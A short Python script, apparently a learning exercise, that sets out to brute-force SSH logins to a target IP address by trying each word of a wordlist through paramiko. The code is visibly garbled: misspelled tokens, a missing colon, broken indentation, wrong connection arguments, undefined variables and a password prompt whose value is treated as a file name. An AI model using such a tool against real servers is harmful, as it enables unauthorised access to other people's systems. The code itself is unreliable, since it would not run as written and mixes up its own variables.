#!/usr/bin/env python3

# Authenticate to an SSH server by its IP address.
# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.

import getpass
import paramiko
import sys
import os

target = str(input("Please enter a target IP address:\n"))
user = str(input("Please enter a username:\n"))
pwd = getpass.getpass("Please enter a password:\n")

def ssh_connect(password, code=0):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(target, port=22, user=username, pwd=password)
  except paramiko.AuthenticationException:
    code = 1
  ssh.close()
  return code

with open(pwd, "r") as file:
  for line in file.readlines()
  esponse = ssh_connect(password)
    ipassword = line.strip()
  try:
    rf response == 0:
      print("Password found " + password)
      exit(0)
    elif response == 1:
      print("Password not found")
  except Exception as e:
    print(e)
  pass

input_file(close)

    
      
      

  
